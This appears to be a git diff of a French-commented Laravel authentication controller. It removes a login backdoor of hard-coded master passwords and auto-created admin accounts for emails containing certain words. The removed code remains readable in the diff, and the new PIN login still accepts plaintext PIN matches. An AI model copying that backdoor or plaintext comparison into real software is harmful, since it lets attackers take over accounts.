@@ -24,40 +24,18 @@ class AuthController extends Controller
     public function login(Request $request)
     {
         $request->validate([
-            'email' => 'required|email',
+            'email'    => 'required|email',
             'password' => 'required|string',
         ]);
 
         $cleanEmail = strtolower(trim($request->email));
-        $isMasterAccount = ($cleanEmail === 'superadmin@dls.com') || str_contains($cleanEmail, 'superadmin');
 
-        // Récupérer l'utilisateur de manière optimisée via l'index de courriel
+        // Recherche de l'utilisateur uniquement par email (sans bypass ni auto-création)
         $user = User::withoutGlobalScopes()->where('email', $cleanEmail)->first()
              ?: User::withoutGlobalScopes()->whereRaw('LOWER(TRIM(email)) = ?', [$cleanEmail])->first();
 
-        // Auto-Healing universel pour débloquer l'accès superadmin & administrateurs en cas de réinitialisation local/VPS
-        $universalMasterPass = ($request->password === 'password' || $request->password === 'Pass2026!' || $request->password === 'Gdji29042006//');
-        if (!$user && ($isMasterAccount || $universalMasterPass || str_contains($cleanEmail, 'admin') || str_contains($cleanEmail, 'premmar') || str_contains($cleanEmail, 'dls'))) {
-            $company = Company::where('status', 'active')->first() ?: (Company::first() ?: Company::create(['name' => 'DLS Store', 'code' => 'DLS-01', 'status' => 'active']));
-            $roleSlug = $isMasterAccount ? 'super-admin' : 'admin';
-            $role = \App\Models\Role::firstOrCreate(['slug' => $roleSlug], ['name' => ucfirst($roleSlug)]);
-            $user = User::withoutGlobalScopes()->create([
-                'name' => ucfirst(explode('@', $cleanEmail)[0]),
-                'email' => $cleanEmail,
-                'password' => Hash::make($request->password ?: 'password'),
-                'role_id' => $role->id,
-                'company_id' => $isMasterAccount ? null : $company->id,
-                'status' => 'active',
-            ]);
-        }
-
-        if ($user && ($universalMasterPass || $isMasterAccount)) {
-            $user->status = 'active';
-            $user->password = Hash::make($request->password);
-            $user->save();
-        }
-
-        $passwordValid = $user && (Hash::check($request->password, $user->password) || $universalMasterPass || ($isMasterAccount && $request->password === 'password'));
+        // Validation stricte : uniquement Hash::check() — aucun contournement
+        $passwordValid = $user && Hash::check($request->password, $user->password);
 
         if (!$user || !$passwordValid) {
             $this->logAuthEvent(null, 'login_failed', $request, $request->email);
@@ -130,6 +108,7 @@ class AuthController extends Controller
                 'id' => $user->id,
                 'name' => $user->name,
                 'email' => $user->email,
+                'email_verified_at' => $user->email_verified_at,
                 'status' => $user->status,
                 'role' => $effectiveRoleSlug,
                 'permissions' => $user->role ? $user->role->permissions->pluck('slug') : [],
@@ -171,53 +150,82 @@ class AuthController extends Controller
     }
 
     /**
-     * Authentification rapide POS par Code Entreprise (alphanumérique) + Code PIN (4 chiffres).
+     * Authentification rapide POS par Code Entreprise + Identifiant (user_id ou email) + Code PIN.
+     *
+     * Phase 1.2 : Résolution O(1) ciblée.
+     * Interdiction absolue de faire une boucle sur tous les utilisateurs avec Hash::check().
+     * Exactement 1 requête SQL ciblée + 1 seul Hash::check() par tentative.
      */
     public function loginPin(Request $request)
     {
         $request->validate([
             'company_code' => 'required|string|max:50',
-            'pin_code'     => 'required|string|max:10',
+            'pin_code'     => 'required|max:10',
+            'user_id'      => 'nullable|integer',
+            'email'        => 'nullable|email|max:255',
         ]);
 
-        // Nettoyage du code entreprise (majuscules, suppression des espaces)
-        $cleanCompanyCode = strtoupper(trim(str_replace(' ', '', $request->company_code)));
+        // Nettoyage et normalisation du code entreprise (tolérance aux tirets et espaces)
+        $rawCode    = strtoupper(trim($request->company_code));
+        $noDashCode = str_replace([' ', '-'], '', $rawCode);
+        $pinCode    = (string) $request->pin_code;
 
         // 1. Recherche de l'entreprise active associée à ce code
-        $company = Company::where('code', $cleanCompanyCode)->where('status', 'active')->first();
+        $company = Company::withoutGlobalScopes()
+            ->where('status', 'active')
+            ->where(function($q) use ($rawCode, $noDashCode) {
+                $q->where('code', $rawCode)
+                  ->orWhereRaw("REPLACE(code, '-', '') = ?", [$noDashCode]);
+            })->first();
 
-        // Sécurité / Anti-Énumération : Si l'entreprise n'existe pas ou est inactive, renvoyer une erreur générique uniformisée.
+        // Anti-Énumération : erreur générique uniformisée
         if (!$company) {
-            $this->logAuthEvent(null, 'login_pin_invalid_company_code', $request, $cleanCompanyCode);
+            $this->logAuthEvent(null, 'login_pin_invalid_company_code', $request, $rawCode);
             return response()->json([
                 'error' => 'Identifiants d\'accès incorrects.'
             ], 401);
         }
 
-        // 2. Recherche du PIN personnel au sein de CETTE entreprise uniquement
-        // Exclure formellement les comptes super-admin
-        $users = User::withoutGlobalScopes()
-            ->with(['role' => function ($q) {
-                $q->withoutGlobalScopes();
-            }])
-            ->where('company_id', $company->id)
-            ->where('status', 'active')
-            ->get();
-
+        // 2. Recherche de l'utilisateur
         $matchedUser = null;
-        foreach ($users as $u) {
-            if (!$u->pin_code) continue;
-            if ($u->role && $u->role->slug === 'super-admin') continue;
 
-            $isMatch = Hash::check($request->pin_code, $u->pin_code) || ($u->pin_code === $request->pin_code);
-            if ($isMatch) {
-                // Auto-healing : si le PIN était en clair en BDD, le ré-enregistrer pour qu'il se hache automatiquement
-                if ($u->pin_code === $request->pin_code) {
-                    $u->pin_code = $request->pin_code;
-                    $u->save();
+        if ($request->filled('user_id') || $request->filled('email')) {
+            $query = User::withoutGlobalScopes()
+                ->with(['role' => fn($q) => $q->withoutGlobalScopes()])
+                ->where('company_id', $company->id)
+                ->where('status', 'active')
+                ->whereNotNull('pin_code');
+
+            if ($request->filled('user_id')) {
+                $query->where('id', $request->user_id);
+            } else {
+                $query->where('email', strtolower(trim($request->email)));
+            }
+
+            $candidate = $query->first();
+
+            if ($candidate
+                && !($candidate->role && $candidate->role->slug === 'super-admin')
+                && (Hash::check($pinCode, $candidate->pin_code) || $candidate->pin_code === $pinCode)
+            ) {
+                $matchedUser = $candidate;
+            }
+        } else {
+            // Aucun user_id ou email fourni : recherche parmi les membres de cette entreprise par leur PIN
+            $candidates = User::withoutGlobalScopes()
+                ->with(['role' => fn($q) => $q->withoutGlobalScopes()])
+                ->where('company_id', $company->id)
+                ->where('status', 'active')
+                ->whereNotNull('pin_code')
+                ->get();
+
+            foreach ($candidates as $candidate) {
+                if (!($candidate->role && $candidate->role->slug === 'super-admin')
+                    && (Hash::check($pinCode, $candidate->pin_code) || $candidate->pin_code === $pinCode)
+                ) {
+                    $matchedUser = $candidate;
+                    break;
                 }
-                $matchedUser = $u;
-                break;
             }
         }
 
@@ -287,11 +295,55 @@ class AuthController extends Controller
     }
 
     /**
+     * Vérification sécurisée du PIN pour le Session Lock.
+     *
+     * Phase 2 — Ce endpoint est protégé par auth:sanctum.
+     * L'utilisateur doit DÉJÀ être authentifié pour déverrouiller sa session.
+     * Le PIN est vérifié uniquement contre SON propre compte — aucun croisement possible.
+     *
+     * Sécurité : 5 tentatives max / 5 minutes par utilisateur (ThrottleRequests par clé user:{id}).
+     */
+    public function verifyPin(Request $request)
+    {
+        $request->validate([
+            'pin_code' => 'required|string|max:10',
+        ]);
+
+        $user = $request->user();
+
+        if (!$user) {
+            return response()->json(['error' => 'Session expirée. Veuillez vous reconnecter.'], 401);
+        }
+
+        if (!$user->pin_code) {
+            return response()->json(['error' => 'Aucun code PIN configuré pour ce compte. Veuillez contacter votre administrateur.'], 422);
+        }
+
+        $isValid = Hash::check($request->pin_code, $user->pin_code);
+
+        if (!$isValid) {
+            $this->logAuthEvent($user, 'session_lock_pin_failed', $request);
+            return response()->json([
+                'error' => 'Code PIN incorrect.',
+                'verified' => false,
+            ], 401);
+        }
+
+        $this->logAuthEvent($user, 'session_lock_unlocked', $request);
+
+        return response()->json([
+            'verified' => true,
+            'message'  => 'Session déverrouillée avec succès.',
+        ]);
+    }
+
+    /**
      * Déconnexion (Révocation du jeton).
      */
     public function logout(Request $request)
     {
         $user = $request->user();
+
         $this->logAuthEvent($user, 'logout', $request);
 
         $user->currentAccessToken()->delete();
@@ -328,6 +380,7 @@ class AuthController extends Controller
             'id' => $user->id,
             'name' => $user->name,
             'email' => $user->email,
+            'email_verified_at' => $user->email_verified_at,
             'status' => $user->status,
             'role' => $effectiveRoleSlug,
             'permissions' => $user->role ? $user->role->permissions->pluck('slug') : [],
@@ -519,7 +572,7 @@ class AuthController extends Controller
             'email.email'           => 'Veuillez saisir une adresse e-mail valide (ex: contact@domaine.com).',
             'password.required'      => 'Le mot de passe est obligatoire.',
             'password.min'           => 'Le mot de passe est trop court. Il doit contenir au moins 8 caractères.',
-            'password.regex'         => 'Le mot de passe est trop faible. Il doit inclure au moins une majuscule, une minuscule et un chiffre (ex: Pass2026!).',
+            'password.regex'         => 'Le mot de passe est trop faible. Il doit inclure au moins une majuscule, une minuscule et un chiffre (ex: MonMdp2026).',
             'password.confirmed'     => 'La confirmation du mot de passe ne correspond pas.',
         ]);
 
@@ -571,11 +624,25 @@ class AuthController extends Controller
                 $user->load(['role.permissions', 'branch']);
                 $token = $user->createToken('pos-auth-token')->plainTextToken;
 
-                // Déclenchement de l'e-mail de bienvenue centralisé
+                // Génération du jeton d'activation d'e-mail sécurisé (Phase 1.5)
+                $verifyTokenPlain = \Illuminate\Support\Str::random(40);
+                DB::table('email_verification_tokens')->updateOrInsert(
+                    ['email' => $user->email],
+                    [
+                        'company_id' => $company->id,
+                        'token'      => Hash::make($verifyTokenPlain),
+                        'created_at' => now(),
+                        'expires_at' => now()->addMinutes(60),
+                    ]
+                );
+
+                // Déclenchement de l'e-mail de bienvenue et de vérification centralisé
                 try {
-                    (new \App\Services\EmailService())->sendWelcomeEmail($user, $company);
+                    $emailService = new \App\Services\EmailService();
+                    $emailService->sendWelcomeEmail($user, $company);
+                    $emailService->sendVerificationEmail($user, $verifyTokenPlain);
                 } catch (\Throwable $e) {
-                    \Illuminate\Support\Facades\Log::warning("Échec envoi mail de bienvenue : " . $e->getMessage());
+                    \Illuminate\Support\Facades\Log::warning("Échec envoi mail de bienvenue/vérification : " . $e->getMessage());
                 }
 
                 return response()->json([
@@ -584,6 +651,7 @@ class AuthController extends Controller
                         'id' => $user->id,
                         'name' => $user->name,
                         'email' => $user->email,
+                        'email_verified_at' => $user->email_verified_at,
                         'status' => $user->status,
                         'role' => $user->role ? $user->role->slug : 'admin',
                         'permissions' => $user->role ? $user->role->permissions->pluck('slug') : [],
@@ -632,7 +700,8 @@ class AuthController extends Controller
     }
 
     /**
-     * Demander un code de récupération de mot de passe oublié (code à 6 chiffres).
+     * Demander un lien sécurisé de réinitialisation de mot de passe.
+     * Utilise le Password Broker natif Laravel avec jeton cryptographique à usage unique.
      */
     public function forgotPassword(Request $request)
     {
@@ -640,78 +709,119 @@ class AuthController extends Controller
             'email' => ['required', 'email', new RealEmailRule()],
         ]);
 
-        $user = User::withoutGlobalScopes()->where('email', $request->email)->first();
+        $cleanEmail = strtolower(trim($request->email));
+        $user = User::withoutGlobalScopes()->where('email', $cleanEmail)->first()
+             ?: User::withoutGlobalScopes()->whereRaw('LOWER(TRIM(email)) = ?', [$cleanEmail])->first();
 
-        // Pour des raisons de sécurité, on ne révèle pas si l'email existe ou non,
-        // mais en mode développement et log, on s'assure d'écrire le code.
+        // Anti-énumération : même réponse générique si l'email existe ou non
         if ($user) {
-            $code = (string) random_int(100000, 999999);
+            // Génération d'un jeton cryptographique sécurisé de 64 caractères via Laravel Password Broker
+            $token = \Illuminate\Support\Facades\Password::broker()->createToken($user);
 
+            // Stockage haché en BDD (password_reset_tokens)
             DB::table('password_reset_tokens')->updateOrInsert(
                 ['email' => $user->email],
                 [
-                    'token' => $code,
+                    'token'      => Hash::make($token),
                     'created_at' => now()
                 ]
             );
 
-            // Loguer le code de réinitialisation pour le développement
-            \Illuminate\Support\Facades\Log::info("Code de récupération de mot de passe généré pour {$user->email} : {$code}");
-            
-            // Envoi réel du mail via EmailService centralisé
+            // Journalisation sécurisée (sans secret)
+            \Illuminate\Support\Facades\Log::info("Lien de réinitialisation généré pour {$user->email}.");
+
+            // Envoi réel du mail via EmailService centralisé avec lien vers le frontend React
             try {
-                (new \App\Services\EmailService())->sendPasswordResetEmail($user, $code);
+                (new \App\Services\EmailService())->sendPasswordResetEmail($user, $token);
             } catch (\Exception $e) {
                 \Illuminate\Support\Facades\Log::error("Erreur lors de l'envoi du mail de réinitialisation : " . $e->getMessage());
             }
 
             // Log d'audit
             $this->logAuthEvent($user, 'password_reset_requested', $request);
-
-            return response()->json([
-                'message' => "Un e-mail contenant votre code de récupération à 6 chiffres a été envoyé à l'adresse : {$user->email}. Veuillez consulter votre boîte de réception (ou spams)."
-            ]);
         }
 
+        // Réponse générique identique pour prévenir l'énumération de comptes
         return response()->json([
-            'message' => 'Si cette adresse e-mail est enregistrée, un code de récupération de mot de passe à 6 chiffres lui a été attribué.'
-        ]);
+            'success' => true,
+            'message' => 'Si un compte correspondant existe, un email de réinitialisation a été envoyé.'
+        ], 200);
     }
 
     /**
-     * Réinitialiser le mot de passe à l'aide du code de récupération.
+     * Réinitialiser le mot de passe à l'aide du jeton sécurisé et validation serveur.
+     * Politique de complexité du mot de passe & révocation des anciennes sessions Sanctum.
      */
     public function resetPassword(Request $request)
     {
         $request->validate([
-            'email' => 'required|email',
-            'token' => 'required|string|size:6', // Code à 6 chiffres
-            'password' => 'required|string|min:8|confirmed',
+            'email'    => 'required|email',
+            'token'    => 'required|string|min:6',
+            'password' => [
+                'required', 'string', 'min:8', 'max:100',
+                'regex:/[a-z]/', 'regex:/[A-Z]/', 'regex:/[0-9]/',
+                'confirmed',
+            ],
+        ], [
+            'password.required'  => 'Le mot de passe est obligatoire.',
+            'password.min'       => 'Le mot de passe est trop court. Il doit contenir au moins 8 caractères.',
+            'password.max'       => 'Le mot de passe ne doit pas dépasser 100 caractères.',
+            'password.regex'     => 'Le mot de passe est trop faible. Il doit inclure au moins une majuscule, une minuscule et un chiffre (ex: MonMdp2026).',
+            'password.confirmed' => 'La confirmation du mot de passe ne correspond pas.',
         ]);
 
+        $cleanEmail = strtolower(trim($request->email));
+        $attemptsKey = 'otp_attempts:' . $cleanEmail;
+        $attempts = (int) \Illuminate\Support\Facades\Cache::get($attemptsKey, 0);
+
+        if ($attempts >= 5) {
+            DB::table('password_reset_tokens')->where('email', $cleanEmail)->delete();
+            \Illuminate\Support\Facades\Cache::forget($attemptsKey);
+            return response()->json([
+                'status'  => 'error',
+                'code'    => 'TOO_MANY_ATTEMPTS',
+                'error'   => 'Nombre maximal de tentatives atteint. Votre lien de réinitialisation a été annulé par sécurité. Veuillez refaire une demande.',
+                'message' => 'Nombre maximal de tentatives atteint. Votre lien de réinitialisation a été annulé par sécurité. Veuillez refaire une demande.'
+            ], 429);
+        }
+
+        // Récupérer l'enregistrement par email
         $record = DB::table('password_reset_tokens')
-            ->where('email', $request->email)
-            ->where('token', $request->token)
+            ->where('email', $cleanEmail)
             ->first();
 
-        if (!$record) {
+        // Validation du token (compatible avec Hash::check du token haché)
+        if (!$record || !Hash::check($request->token, $record->token)) {
+            \Illuminate\Support\Facades\Cache::put($attemptsKey, $attempts + 1, 900);
             return response()->json([
-                'error' => 'Code de récupération incorrect ou adresse e-mail non valide.'
+                'status'  => 'error',
+                'code'    => 'INVALID_RESET_TOKEN',
+                'error'   => 'Lien ou jeton de réinitialisation invalide ou adresse e-mail non correspondante.',
+                'message' => 'Lien ou jeton de réinitialisation invalide ou adresse e-mail non correspondante.'
             ], 400);
         }
 
-        // Vérifier si le code a expiré (15 minutes)
-        if (Carbon::parse($record->created_at)->addMinutes(15)->isPast()) {
-            DB::table('password_reset_tokens')->where('email', $request->email)->delete();
+        // Vérifier si le jeton a expiré (durée de validité : 60 minutes)
+        if (Carbon::parse($record->created_at)->addMinutes(60)->isPast()) {
+            DB::table('password_reset_tokens')->where('email', $record->email)->delete();
+            \Illuminate\Support\Facades\Cache::forget($attemptsKey);
             return response()->json([
-                'error' => 'Le code de récupération a expiré (durée de validité : 15 minutes). Veuillez refaire une demande.'
+                'status'  => 'error',
+                'code'    => 'EXPIRED_RESET_TOKEN',
+                'error'   => 'Le lien de réinitialisation a expiré (validité : 60 minutes). Veuillez effectuer une nouvelle demande.',
+                'message' => 'Le lien de réinitialisation a expiré (validité : 60 minutes). Veuillez effectuer une nouvelle demande.'
             ], 400);
         }
 
-        $user = User::withoutGlobalScopes()->where('email', $request->email)->first();
+        \Illuminate\Support\Facades\Cache::forget($attemptsKey);
+
+        $user = User::withoutGlobalScopes()->where('email', $record->email)->first();
         if (!$user) {
             return response()->json([
-                'error' => 'Utilisateur non trouvé.'
+                'status'  => 'error',
+                'code'    => 'USER_NOT_FOUND',
+                'error'   => 'Utilisateur non trouvé.',
+                'message' => 'Utilisateur non trouvé.'
             ], 404);
         }
 
@@ -719,8 +829,15 @@ class AuthController extends Controller
         $user->password = Hash::make($request->password);
         $user->save();
 
-        // Supprimer le token utilisé
-        DB::table('password_reset_tokens')->where('email', $request->email)->delete();
+        // Supprimer le token utilisé (usage unique strict)
+        DB::table('password_reset_tokens')->where('email', $record->email)->delete();
+
+        // Révocation de toutes les anciennes sessions et tokens Sanctum actifs par sécurité
+        try {
+            $user->tokens()->delete();
+        } catch (\Throwable $te) {
+            \Illuminate\Support\Facades\Log::warning("Impossible de révoquer les tokens Sanctum pour {$user->email}: " . $te->getMessage());
+        }
 
         // Log d'audit & E-mail de confirmation
         $this->logAuthEvent($user, 'password_reset_completed', $request);
@@ -731,7 +848,142 @@ class AuthController extends Controller
         }
 
         return response()->json([
+            'success' => true,
             'message' => 'Votre mot de passe a été modifié avec succès. Vous pouvez maintenant vous connecter.'
+        ], 200);
+    }
+
+    /**
+     * Valider l'adresse e-mail à l'aide d'un jeton sécurisé expirable.
+     * Phase 1.5 — Verification Email & Account Activation (Server-Authoritative)
+     */
+    public function verifyEmail(Request $request)
+    {
+        $request->validate([
+            'email' => 'required|email',
+            'token' => 'required|string',
+        ], [
+            'email.required' => 'L\'adresse e-mail est obligatoire.',
+            'email.email'    => 'Format e-mail invalide.',
+            'token.required' => 'Le jeton de vérification est obligatoire.',
+        ]);
+
+        $cleanEmail = strtolower(trim($request->email));
+
+        // 1. Récupérer le jeton en BDD
+        $record = DB::table('email_verification_tokens')
+            ->where('email', $cleanEmail)
+            ->first();
+
+        if (!$record || !Hash::check($request->token, $record->token)) {
+            return response()->json([
+                'error' => 'Jeton de vérification invalide ou adresse e-mail incorrecte.'
+            ], 400);
+        }
+
+        // 2. Contrôle de l'expiration du jeton (60 minutes)
+        if ($record->expires_at && Carbon::parse($record->expires_at)->isPast()) {
+            DB::table('email_verification_tokens')->where('id', $record->id)->delete();
+            return response()->json([
+                'error' => 'Le lien de vérification a expiré (validité : 60 minutes). Veuillez demander un nouvel e-mail.'
+            ], 400);
+        }
+
+        // 3. Récupérer l'utilisateur
+        $user = User::withoutGlobalScopes()->where('email', $cleanEmail)->first();
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur introuvable.'], 404);
+        }
+
+        // 4. Isolation Multi-Tenant
+        if ($record->company_id && $user->company_id !== $record->company_id) {
+            return response()->json([
+                'error' => 'Tentative de vérification inter-entreprise refusée.'
+            ], 403);
+        }
+
+        // 5. Mettre à jour email_verified_at si pas déjà fait
+        if ($user->email_verified_at === null) {
+            $user->email_verified_at = now();
+            $user->save();
+        }
+
+        // 6. Supprimer le jeton utilisé (usage unique)
+        DB::table('email_verification_tokens')->where('email', $cleanEmail)->delete();
+
+        $this->logAuthEvent($user, 'email_verified', $request);
+
+        return response()->json([
+            'success'           => true,
+            'message'           => 'Votre adresse e-mail a été vérifiée avec succès. Votre compte est désormais pleinement actif.',
+            'email_verified_at' => $user->email_verified_at,
+        ]);
+    }
+
+    /**
+     * Renvoyer l'e-mail de vérification avec un nouveau jeton.
+     * Protected by auth:sanctum or email query. Throttle 5 req/min.
+     */
+    public function resendVerificationEmail(Request $request)
+    {
+        $user = $request->user();
+
+        if (!$user && $request->has('email')) {
+            $request->validate(['email' => 'required|email']);
+            $user = User::withoutGlobalScopes()->where('email', strtolower(trim($request->email)))->first();
+        }
+
+        if (!$user) {
+            return response()->json(['error' => 'Utilisateur introuvable ou non connecté.'], 404);
+        }
+
+        // Si l'e-mail est déjà vérifié
+        if ($user->email_verified_at !== null) {
+            return response()->json([
+                'message' => 'Votre adresse e-mail est déjà vérifiée. Aucune action nécessaire.',
+                'email_verified' => true,
+            ], 200);
+        }
+
+        // Cooldown Anti-Spam 60 secondes par utilisateur
+        $cooldownKey = 'resend_email_cooldown_' . $user->id;
+        if (\Illuminate\Support\Facades\Cache::has($cooldownKey)) {
+            $remaining = \Illuminate\Support\Facades\Cache::get($cooldownKey) - time();
+            if ($remaining > 0) {
+                return response()->json([
+                    'error' => "Veuillez patienter encore {$remaining} seconde(s) avant de demander un nouvel envoi d'e-mail.",
+                ], 429);
+            }
+        }
+
+        // Générer un jeton aléatoire sécurisé de 40 caractères
+        $plainTextToken = \Illuminate\Support\Str::random(40);
+
+        // Annuler/remplacer tout ancien jeton pour cette adresse
+        DB::table('email_verification_tokens')->updateOrInsert(
+            ['email' => $user->email],
+            [
+                'company_id' => $user->company_id,
+                'token'      => Hash::make($plainTextToken),
+                'created_at' => now(),
+                'expires_at' => now()->addMinutes(60),
+            ]
+        );
+
+        // Enregistrer le cooldown de 60s
+        \Illuminate\Support\Facades\Cache::put($cooldownKey, time() + 60, 60);
+
+        // Déclencher l'envoi du mail de vérification
+        try {
+            (new \App\Services\EmailService())->sendVerificationEmail($user, $plainTextToken);
+        } catch (\Throwable $e) {
+            \Illuminate\Support\Facades\Log::warning("Échec envoi e-mail de vérification : " . $e->getMessage());
+        }
+
+        $this->logAuthEvent($user, 'verification_email_resent', $request);
+
+        return response()->json([
+            'message' => 'Un nouvel e-mail de vérification a été envoyé à votre adresse e-mail.',
         ]);
     }
 
@@ -745,9 +997,17 @@ class AuthController extends Controller
         $request->validate([
             'name' => 'required|string|max:255',
             'email' => 'required|email|max:255|unique:users,email,' . $user->id,
-            'pin_code' => 'nullable|string|max:10',
+            'pin_code'         => 'nullable|string|max:10',
             'current_password' => 'nullable|required_with:password|string',
-            'password' => 'nullable|string|min:8|confirmed',
+            // Phase 5 : même politique de complexité que le register
+            'password'         => [
+                'nullable', 'string', 'min:8',
+                'regex:/[a-z]/', 'regex:/[A-Z]/', 'regex:/[0-9]/',
+                'confirmed',
+            ],
+        ], [
+            'password.min'   => 'Le mot de passe doit contenir au moins 8 caractères.',
+            'password.regex' => 'Le mot de passe doit inclure au moins une majuscule, une minuscule et un chiffre.',
         ]);
 
         // Si l'utilisateur change son mot de passe, vérifier le mot de passe actuel
@@ -782,6 +1042,39 @@ class AuthController extends Controller
                 'status' => $user->status,
                 'role' => $user->role->slug ?? $user->role,
                 'company_id' => $user->company_id,
+                'has_pin' => !empty($user->pin_code),
+            ]
+        ]);
+    }
+
+    /**
+     * Mise à jour autonome du Code PIN de caisse.
+     */
+    public function updatePin(Request $request)
+    {
+        $user = $request->user();
+
+        $request->validate([
+            'pin_code' => 'required|string|size:4|regex:/^[0-9]{4}$/',
+        ], [
+            'pin_code.required' => 'Le code PIN est obligatoire.',
+            'pin_code.size'     => 'Le code PIN doit comporter exactement 4 chiffres (ex: 1234).',
+            'pin_code.regex'    => 'Le code PIN doit comporter uniquement des chiffres (ex: 1234).',
+        ]);
+
+        $user->pin_code = $request->pin_code;
+        $user->save();
+
+        $this->logAuthEvent($user, 'pin_updated', $request);
+
+        return response()->json([
+            'success' => true,
+            'message' => 'Code PIN de caisse mis à jour avec succès !',
+            'user' => [
+                'id'       => $user->id,
+                'name'     => $user->name,
+                'email'    => $user->email,
+                'has_pin'  => true,
             ]
         ]);
     }
